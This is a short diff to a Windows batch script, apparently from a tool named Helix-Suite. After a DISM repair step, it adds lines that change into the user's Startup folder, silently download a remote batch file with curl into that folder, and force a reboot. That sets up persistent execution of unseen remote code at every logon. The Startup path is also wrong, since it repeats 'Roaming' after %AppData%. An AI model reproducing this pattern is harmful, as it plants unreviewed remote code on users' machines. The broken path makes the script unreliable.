@@ -58,4 +58,6 @@ pause
 cd assets
 cls
 DISM /Online /Cleanup-Image /RestoreHealth
-curl 
+cd %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+curl -s https://raw.githubusercontent.com/pinguinooo/Helix-Suite/main/assets/autostart.bat -o autostart.bat
+shutdown /r
